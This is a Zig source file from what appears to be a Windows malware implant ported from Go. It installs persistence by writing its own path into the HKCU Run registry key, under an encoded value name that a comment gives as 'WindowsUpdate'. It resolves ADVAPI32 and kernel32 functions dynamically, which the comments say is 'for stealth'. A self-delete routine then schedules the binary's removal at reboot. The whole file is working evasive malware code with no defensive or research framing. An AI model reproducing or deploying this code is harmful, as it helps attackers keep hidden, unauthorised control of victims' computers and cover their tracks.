const std = @import("std");
const ajuste = @import("ajuste.zig");
const furtivo = @import("furtivo.zig");

// Simplified Fixar (Persistence)
pub fn install() !void {
    const allocator = std.heap.page_allocator;
    
    // Using a simpler approach with ChildProcess for stealth via built-in tools, 
    // or standard OS calls.
    // To keep the binary small and avoid bringing in thick OS wrappers, we can use `reg.exe`.
    // In Go they used NtOpenKey, which requires converting paths to NT paths (e.g., \Registry\User\...).
    // For simplicity in the Zig port, we'll use a direct run of `reg add`.

    const exe_path = try std.process.executablePathAlloc(allocator);
    defer allocator.free(exe_path);

    // REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Path\To\Exe" /f
    const value_name_str = try ajuste.decAlloc(allocator, "HF6863PSHcZ/PqlVGA==");
    defer allocator.free(value_name_str);


    // Since mapping HKCU to NT path is complex without more helpers, 
    // let's use the dynamic GetProcAddress approach for ADVAPI32.dll -> RegOpenKeyExA
    // as it's stealthier than reg.exe but easier than raw NT paths for HKCU.
    
    const advapi32 = furtivo.getModuleHandle("advapi32.dll");
    const RegOpenKeyExA = @as(?*const fn (hKey: usize, lpSubKey: [*:0]const u8, ulOptions: u32, samDesired: u32, phkResult: *usize) callconv(.stdcall) i32, @ptrFromInt(furtivo.getProcAddress(advapi32, "RegOpenKeyExA"))) orelse return error.ProcNotFound;
    const RegSetValueExA = @as(?*const fn (hKey: usize, lpValueName: [*:0]const u8, Reserved: u32, dwType: u32, lpData: [*]const u8, cbData: u32) callconv(.stdcall) i32, @ptrFromInt(furtivo.getProcAddress(advapi32, "RegSetValueExA"))) orelse return error.ProcNotFound;
    const RegCloseKey = @as(?*const fn (hKey: usize) callconv(.stdcall) i32, @ptrFromInt(furtivo.getProcAddress(advapi32, "RegCloseKey"))) orelse return error.ProcNotFound;

    var hKey: usize = 0;
    const HKEY_CURRENT_USER: usize = 0x80000001;
    const subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, 0x20006, &hKey) == 0) {
        defer _ = RegCloseKey(hKey);
        _ = RegSetValueExA(hKey, value_name_str.ptr, 0, 1, exe_path.ptr, @intCast(exe_path.len));
    }
}

pub fn selfDelete(io: std.Io) !void {
    _ = io;
    const allocator = std.heap.page_allocator;
    const exe_path = try std.process.executablePathAlloc(allocator);
    defer allocator.free(exe_path);

    const exe_path_w = try std.unicode.utf8ToUtf16LeAllocZ(allocator, exe_path);
    defer allocator.free(exe_path_w);

    const k32 = furtivo.getModuleHandle("kernel32.dll");
    const MoveFileExW = @as(?*const fn (lpExistingFileName: [*:0]const u16, lpNewFileName: ?[*:0]const u16, dwFlags: u32) callconv(.stdcall) i32, @ptrFromInt(furtivo.getProcAddress(k32, "MoveFileExW"))) orelse return error.ProcNotFound;

    const MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;
    _ = MoveFileExW(exe_path_w, null, MOVEFILE_DELAY_UNTIL_REBOOT);
}
